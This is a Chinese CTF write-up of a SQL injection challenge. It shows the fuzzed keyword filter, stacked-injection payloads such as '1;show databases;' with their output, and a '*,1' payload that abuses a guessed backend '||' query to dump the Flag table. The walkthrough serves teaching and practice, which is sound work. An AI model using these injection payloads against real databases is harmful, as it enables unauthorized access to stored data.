输入数字有回显，输入'或abc无回显，输入or，true回显nonono
说明有过滤
具体可以通过关键字字典爆破得知：`prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile|readfile|where|from|union|update|delete|if|sleep|extractvalue|updatexml|or|and|&|"`
（好像这些被过滤后**报错注入，union联合注入，盲注皆不可行**）
我们要使用的方法是**堆叠注入**
**堆叠注入：将多条SQL语句放在一起，并用分号;隔开。**

输入：查库
```mysql
1;show databases;
```
回显：
```output
Array ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test )
```

输入：查当前所在库
```mysql
1;select database();
```
回显：
```output
Array ( [0] => 1 ) Array ( [0] => ctf )
```

输入：查库中表
```mysql
1;show tables;
```
回显：
```output
Array ( [0] => 1 ) Array ( [0] => Flag )
```

flag应该就在Flag字段中，但是flag和from都被过滤了
**输入字母无回显**，**输入数字有回显**，试试**输入0**，发现**无回显**
可以猜测：**后端代码含有`||`或运算符**
**SQL语句中有一特性：字符串在逻辑或符号`||`的一端表示 0**
猜测后端代码为
```mysql
select %s || 内置一个列名 from Flag; 
```
假设这个列名为flag，则
```mysql
select %s || flag from Flag; 
```
此时我们输入`*,1`，则拼凑为：
```mysql
select *,1 || flag from Flag;
```
等价于：
```mysql
select *,1 from Flag;
```
`select 1 from`的意思其实是建立一个临时列，这个列的所有初始值都被设为1
重点是前面有个`*`，查出了Flag表中的所有内容

为何等价？可以这样理解：
**输入`*，1`后，sql语句就变成了`select * , 1 || flag from Flag`。
其中分为两部分： (1)`select * from Flag`(2)`select 1 || flag from Flag`
`select * from Flag`通过查看表Flag中的所有数据可以得到flag。**

还是不能理解？看个特例：
非预期漏洞的概念：
**若输入`1，1`。那么sql语句就变成了`select 1, 1 || flag from Flag`。
其中由`[1]`和`[1 || flag]`两部分组成，而非 `[1,1] || [flag]`。**
非预期漏洞是**利用数据库对符号判断的不准确形成的漏洞。**

所以我们只需传入`*,任意数字`即可成功查看表Flag中的数据得到flag
![[Pasted image 20250124233902.png]]
